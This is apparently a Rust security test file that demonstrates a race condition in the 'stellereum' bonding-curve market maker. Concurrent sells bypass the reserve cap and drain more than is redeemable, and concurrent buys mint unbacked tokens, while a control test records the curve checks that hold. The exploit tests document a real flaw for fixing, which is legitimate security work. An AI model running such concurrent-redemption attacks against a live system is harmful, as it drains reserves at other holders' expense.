//! HUNT: the PMM's bonding curve is a read-clone-commit WITHOUT holding a lock
//! across the whole operation.
//!
//! `pmm_buy` (src/state_engine.rs:1317) and `pmm_sell` (:1382) each
//!   1. take `self.pmm_read()`, clone it, run the curve, DROP the read lock,
//!   2. move real value (burn wUSDT / debit native STELL, mint wUSDT),
//!   3. take `self.pmm_write()` and overwrite with the clone.
//!
//! The reserve cap (`usable_reserve_micro`, the ring-fenced 20% buffer that
//! pmm.rs documents as the reason a full instant drain is impossible) is only
//! ever checked against the CLONE. Two concurrent sells both pass the check
//! against the same reserve and both pay out, while the final curve state
//! reflects only one of them.

use ed25519_dalek::SigningKey;
use rand::rngs::OsRng;
use std::sync::Arc;

use stellereum::state_engine::{AccountState, InMemoryStateEngine};
use stellereum::token::TokenMetadata;

const MINTER: [u8; 32] = [0x11u8; 32];

async fn setup(usdt_to_buyer: u64, reserve: u64) -> (InMemoryStateEngine, [u8; 32], [u8; 32]) {
    let engine = InMemoryStateEngine::new();
    let sk = SigningKey::generate(&mut OsRng);
    let buyer = sk.verifying_key().to_bytes();
    engine.update_account(AccountState::new(buyer, 0)).await;
    let meta = TokenMetadata {
        name: "Wrapped USDT".into(),
        symbol: "wUSDT".into(),
        decimals: 6,
        total_supply: 0,
        max_supply: None,
        minter: MINTER,
        paused: false,
        description: String::new(),
    };
    let usdt = engine.create_token(MINTER, meta, 0).await.unwrap();
    engine
        .token_execute(
            &usdt,
            MINTER,
            stellereum::token::TokenOp::Mint {
                to: buyer,
                amount: usdt_to_buyer,
            },
        )
        .await
        .unwrap();
    engine.pmm_init_usdt(usdt, reserve).await;
    (engine, buyer, usdt)
}

/// Race N concurrent redemptions of the maximum redeemable amount. Serially
/// only ONE can succeed (the buffer blocks the rest); concurrently the cap is
/// checked N times against the same stale reserve.
#[tokio::test(flavor = "multi_thread", worker_threads = 8)]
async fn concurrent_sells_bypass_the_ring_fenced_reserve_cap() {
    let (engine, buyer, usdt) = setup(1_000_000_000_000, 0).await;
    // Build up minted supply + reserve with one buy.
    let buy = engine.pmm_buy(buyer, 500_000_000_000).await.unwrap();
    println!(
        "bought {} STELL for {} micro-USD; minted_nano={} reserve={} buffer={}",
        buy.stell_minted / 1_000_000_000,
        buy.usdt_paid,
        engine.pmm_read().await.minted_nano,
        engine.pmm_read().await.reserve_micro,
        engine.pmm_read().await.redemption_buffer_micro
    );

    let max = engine.pmm_read().await.max_redeemable_stell();
    let reserve_before = engine.pmm_read().await.reserve_micro;
    let usable_before = engine.pmm_read().await.usable_reserve_micro();
    println!("max redeemable in ONE serial sell: {max} nano");
    println!("reserve {reserve_before}, usable (after buffer) {usable_before}");

    // The attacker holds plenty of STELL to redeem `max` N times over.
    engine
        .update_account(AccountState::new(
            buyer,
            max.saturating_mul(200) + 10_000_000,
        ))
        .await;
    let usdt_before = engine.token_balance(&usdt, &buyer).await;

    let n = 64usize;
    let engine = Arc::new(engine);
    let mut handles = Vec::new();
    for _ in 0..n {
        let e = engine.clone();
        handles.push(tokio::spawn(async move { e.pmm_sell(buyer, max).await }));
    }
    let mut ok = 0u64;
    let mut _paid_total = 0u64;
    for h in handles {
        if let Ok(Ok(r)) = h.await {
            ok += 1;
            _paid_total += r.usdt_paid;
        }
    }
    let usdt_after = engine.token_balance(&usdt, &buyer).await;
    let reserve_after = engine.pmm_read().await.reserve_micro;
    println!("{ok}/{n} concurrent redemptions SUCCEEDED");
    println!("wUSDT received: {}", usdt_after - usdt_before);
    println!(
        "reserve: {reserve_before} -> {reserve_after} (delta {})",
        reserve_before - reserve_after
    );
    println!("PLEDGED buffer that was supposed to make this impossible: {usable_before}");

    assert!(ok > 1, "the race did not land this run; ok={ok}");
    assert!(
        (usdt_after - usdt_before) as u128 > usable_before,
        "ATTACKER'S GOAL: withdrew {} micro-USD of wUSDT while only {} was redeemable",
        usdt_after - usdt_before,
        usable_before
    );
    let drawn = (usdt_after - usdt_before) as u128;
    assert!(
        drawn > usable_before,
        "the curve only recorded ONE redemption: the reserve fell by {} but {} was paid out",
        reserve_before - reserve_after,
        drawn
    );
    println!(
        "MULTIPLIER: withdrew {}x the entire redeemable reserve",
        drawn / usable_before
    );
}

/// The mirror image on the buy side: concurrent buys all price off the same
/// stale `minted_nano`, so a buyer gets more STELL than the curve says their
/// wUSDT is worth.
#[tokio::test(flavor = "multi_thread", worker_threads = 8)]
async fn concurrent_buys_all_price_off_the_same_stale_supply() {
    let (engine, buyer, _usdt) = setup(1_000_000_000_000, 0).await;
    engine.pmm_buy(buyer, 100_000_000_000).await.unwrap();
    let supply_before = engine.pmm_read().await.minted_nano;
    let _reserve_before = engine.pmm_read().await.reserve_micro;
    let price_before = engine.pmm_read().await.price_micro_usd();

    let notional = 10_000_000_000u64; // 10,000 USDT micro each
    let n = 32usize;
    let engine = Arc::new(engine);
    let mut handles = Vec::new();
    for _ in 0..n {
        let e = engine.clone();
        handles.push(tokio::spawn(
            async move { e.pmm_buy(buyer, notional).await },
        ));
    }
    let mut minted = 0u64;
    let mut paid = 0u64;
    for h in handles {
        if let Ok(Ok(r)) = h.await {
            minted += r.stell_minted;
            paid += r.usdt_paid;
        }
    }
    let supply_after = engine.pmm_read().await.minted_nano;
    let _reserve_after = engine.pmm_read().await.reserve_micro;
    println!("price before {price_before}, minted_nano {supply_before} -> {supply_after}");
    println!("{n} buyers each paid {notional} micro ({paid} total), received {minted} nano STELL");
    println!(
        "curve only advanced by {} nano but {} nano were minted",
        supply_after - supply_before,
        minted
    );
    let fair = (minted as u128) * (price_before as u128) / 1_000_000_000;
    println!("fair value at the pre-race price: {fair} micro vs {paid} paid");
    assert!(minted > 0 && paid > 0);
    assert!(
        supply_after - supply_before < minted as u128,
        "the curve advanced {} but {} nano were minted: {} nano are unbacked",
        supply_after - supply_before,
        minted,
        minted as u128 - (supply_after - supply_before)
    );
}

/// NEGATIVE RESULTS on the pure curve: buy/sell round trips, the reserve cap,
/// and the rounding direction all behave. Recorded so nobody re-tries these.
#[test]
fn control_pmm_curve_is_sound() {
    use stellereum::pmm::PrimaryMarketMaker;
    let p = PrimaryMarketMaker::new();
    // 1. Buying then selling the same amount never profits.
    for usd in [10u64, 1_000, 100_000, 10_000_000] {
        let mut q = p.clone();
        let r = q.buy_with_usdt(usd * 1_000_000).unwrap();
        // Selling the WHOLE position back instantly is either refused outright
        // by the ring-fenced buffer, or returns strictly less than was paid in.
        let full = q.sell_stell(r.stell_minted);
        println!(
            "round trip ${usd}: minted {} nano, full sell back -> {:?}",
            r.stell_minted,
            match &full {
                Ok(x) => format!("{} micro", x.usdt_paid),
                Err(e) => format!("{e}"),
            }
        );
        match &full {
            Err(stellereum::pmm::PmmError::InsufficientReserve) => {}
            Ok(x) => assert!(
                x.usdt_paid < usd * 1_000_000,
                "an instant full round trip must never return the whole deposit"
            ),
            Err(e) => panic!("unexpected {e}"),
        }
        // Selling only what is redeemable never returns more than was paid in.
        let mut q2 = p.clone();
        let r2 = q2.buy_with_usdt(usd * 1_000_000).unwrap();
        let m = q2.max_redeemable_stell();
        let back = q2.sell_stell(m).unwrap();
        println!(
            "  redeemable {m} of {} -> {} micro back of {} paid",
            r2.stell_minted,
            back.usdt_paid,
            usd * 1_000_000
        );
        assert!(
            back.usdt_paid <= usd * 1_000_000,
            "a round trip must not profit"
        );
    }
    // 2. The reserve cap is respected SERIALLY: only one max-size sell fits.
    let mut q = p.clone();
    q.buy_with_usdt(1_000_000_000).unwrap();
    let max = q.max_redeemable_stell();
    let first = q.sell_stell(max);
    let second = q.sell_stell(max);
    println!(
        "serial: first sell ok={}, second sell ok={}",
        first.is_ok(),
        second.is_ok()
    );
    assert!(first.is_ok());
    assert!(
        second.is_err(),
        "serially the buffer does block the second redemption"
    );
    // 3. minted_nano cannot go negative and the buffer cannot go negative.
    assert!(q.minted_nano > 0, "minted_nano never goes negative");
    assert!(q.redemption_buffer_micro <= q.reserve_micro);
    assert!(
        matches!(
            q.sell_stell(1),
            Err(stellereum::pmm::PmmError::InsufficientReserve)
                | Err(stellereum::pmm::PmmError::Dust)
        ),
        "1 nano cannot be redeemed once the reserve is empty: {:?}",
        q.sell_stell(1).err()
    );
}
